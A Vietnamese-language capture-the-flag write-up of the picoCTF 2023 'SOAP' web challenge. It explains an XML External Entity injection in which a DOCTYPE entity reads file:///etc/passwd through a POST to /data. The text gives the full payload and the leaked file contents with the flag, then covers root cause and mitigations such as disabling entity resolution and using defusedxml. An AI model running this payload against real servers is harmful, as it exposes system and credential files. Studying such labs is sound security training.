# SOAP — XXE (XML External Entity Injection)

**picoCTF 2023 · Web Exploitation · Medium**

Đề bài chỉ ghi vỏn vẹn: web project bị làm ẩu, không có security review, "liệu bạn có đọc được `/etc/passwd` không?". Hint duy nhất: XML External Entity Injection.

## Recon

Vào trang chủ (`saturn.picoctf.net:58233`) thấy một trang web trường đại học bình thường — mấy card "Carnegie Mellon University Africa", "PicoCTF", "CyLab-Africa", kèm dòng "Special Info" ở cuối trang.

Bật Burp bắt traffic thì thấy trang gọi tới endpoint `/data` bằng POST, body là XML chứ không phải JSON:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<data>
  <ID>
    1
  </ID>
</data>
```

Response trả về:

```html
<strong>Special Info:::: </strong>
University in Kigali, Rwanda offereing MSECE, MSIT and MS EAI
```

Nhìn site map trong Burp thấy có mấy request lặp lại với `ID` khác nhau (1, 2, 3) tương ứng 3 card trên trang — rõ ràng backend nhận `ID` từ XML body, query ra thông tin tương ứng rồi nhét vào HTML. Chỗ này parse XML input trực tiếp từ client, không có gì lạ nếu server dùng thư viện XML parser mặc định (thường cho phép resolve external entity nếu không tắt riêng).

## Khai thác XXE

Ý tưởng chuẩn của XXE: khai báo một entity trỏ ra file hệ thống, rồi tham chiếu entity đó ở chỗ nào server sẽ echo ngược ra response.

Payload gửi lên `/data`:

```xml
<!DOCTYPE foo[
<!ENTITY xee SYSTEM "file:///etc/passwd">
]>
<data>
    <ID>
        &xee;
    </ID>
</data>
```

Giải thích từng phần:

- `<!DOCTYPE foo[...]>` — khai báo DTD nội bộ ngay trong request, đây là chỗ để định nghĩa entity tùy ý.
- `<!ENTITY xee SYSTEM "file:///etc/passwd">` — định nghĩa entity tên `xee`, kiểu `SYSTEM` nghĩa là parser sẽ đi đọc nội dung từ nguồn ngoài, ở đây là file `/etc/passwd` trên chính máy server.
- `&xee;` — chỗ tham chiếu entity, đặt ngay vào vị trí `<ID>` mà bình thường server dùng để lookup dữ liệu. Parser sẽ thay `&xee;` bằng toàn bộ nội dung file trước khi code xử lý tiếp.

Vì backend không tắt tính năng resolve external entity (thường do dùng parser mặc định như `lxml`/`xml.etree` ở Python mà không set `resolve_entities=False`, hoặc tương đương ở các ngôn ngữ khác), nên khi request được xử lý, `&xee;` bị thay bằng nguyên văn nội dung `/etc/passwd`, rồi cả cục đó được nhét vào chỗ vốn dĩ dùng để hiển thị "Special Info".

## Kết quả

Response trả về nguyên file `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3ntlty_55662c16}
```

Dòng cuối cùng chính là user `picoctf` với "password field" chứa luôn flag — cách đặt bẫy quen thuộc của picoCTF: giấu flag vào một dòng trong `/etc/passwd` để chứng minh đã đọc file thành công qua path traversal/LFI/XXE.

## Root cause

- Server parse XML input từ client mà không disable DTD/external entity resolution.
- Không có whitelist gì cho phần `<ID>` — nhận nguyên request body XML rồi cho parser xử lý full quyền, kể cả DOCTYPE tùy ý do client tự khai báo.

## Fix

- Tắt hoàn toàn external entity khi parse XML từ input không tin cậy. Ví dụ ở Python với `lxml`:
  ```python
  parser = etree.XMLParser(resolve_entities=False, no_network=True)
  ```
  hoặc dùng `defusedxml` thay cho `xml.etree.ElementTree`/`lxml` mặc định.
- Nếu không thật sự cần DTD, chặn luôn `<!DOCTYPE>` ở tầng validate input trước khi đưa vào parser.
- Nguyên tắc chung: bất kỳ chỗ nào nhận XML/YAML/JSON có khả năng chứa "chỉ thị xử lý" (processing instruction) từ client, phải parse ở chế độ an toàn nhất, không bao giờ dùng cấu hình mặc định của thư viện cho input chưa được kiểm soát.
